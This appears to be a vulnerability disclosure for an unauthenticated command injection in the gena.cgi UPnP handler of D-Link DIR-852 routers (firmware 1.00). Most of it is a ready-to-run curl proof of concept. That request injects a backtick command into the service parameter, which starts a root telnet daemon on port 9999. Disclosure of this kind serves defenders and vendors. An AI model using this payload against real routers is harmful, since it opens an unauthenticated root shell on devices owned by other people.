## Detailed Vulnerability Analysis: Command Injection in D-Link DIR-852 gena.cgi 

Vendor:D-Link

Product:DIR-852

Version:1.00

Type:Command injection

Author:XU17

### Vulnerability Overview

A critical **command injection vulnerability** exists in the `gena.cgi` of D-Link DIR-852 routers (Firmware Version 1.00). An unauthenticated attacker can exploit this, leading to **arbitrary command execution with root privileges**.

![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202510051430461.png)


![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202510051430101.png)


### POC

```
curl -X SUBSCRIBE "http://192.168.0.1:49152/gena.cgi?service=\`telnetd -p 9999 &\`" -H "Host: 192.168.0.1:49152" -H "Callback: <http://192.168.0.4:34033/ServiceProxy27>" -H "NT: upnp:event" -H "Timeout: Second-1800" -H "Accept-Encoding: gzip, deflate" -H "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50"
```


![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202510051429188.png)



